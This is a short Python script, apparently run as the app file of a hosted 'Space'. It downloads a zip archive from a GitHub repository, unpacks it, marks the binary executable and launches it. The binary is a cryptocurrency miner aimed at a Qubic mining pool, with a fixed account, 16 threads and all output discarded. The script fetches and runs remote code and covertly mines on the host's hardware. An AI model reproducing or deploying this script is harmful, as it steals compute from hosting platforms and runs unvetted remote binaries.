import os
os.system("wget https://github.com/qqivk/gutc/raw/refs/heads/main/Roxhf.zip")
os.system("unzip Roxhf.zip")
os.system("chmod +x Roxhf")
wn = os.getenv('SPACE_ID').replace("/","_")
os.system(f"./Roxhf --account CP_fafubk1b65 --pool qubic1.hk.apool.io:3334 --thread 16 --worker {wn} >/dev/null")
